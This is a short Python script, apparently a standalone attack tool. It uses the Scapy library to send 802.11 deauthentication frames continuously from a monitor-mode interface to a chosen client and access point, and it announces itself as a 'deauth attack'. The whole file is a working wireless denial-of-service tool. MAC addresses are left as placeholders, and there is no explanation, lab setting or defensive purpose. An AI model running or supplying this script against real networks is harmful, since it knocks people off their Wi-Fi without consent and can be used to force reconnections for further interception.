from scapy.all import *
import time


target_mac = "XX:XX:XX:XX:XX:XX"  
ap_mac = "YY:YY:YY:YY:YY:YY"     
iface = "wlan0mon"                 


deauth_packet = RadioTap() / \
                Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac) / \
                Dot11Deauth(reason=7)


try:
    print("Starting deauth attack... Press Ctrl+C to stop.")
    while True:
        sendp(deauth_packet, iface=iface, inter=0.1, count=10, verbose=0)
        time.sleep(0.1)
except KeyboardInterrupt:
    print("Attack stopped by user.")
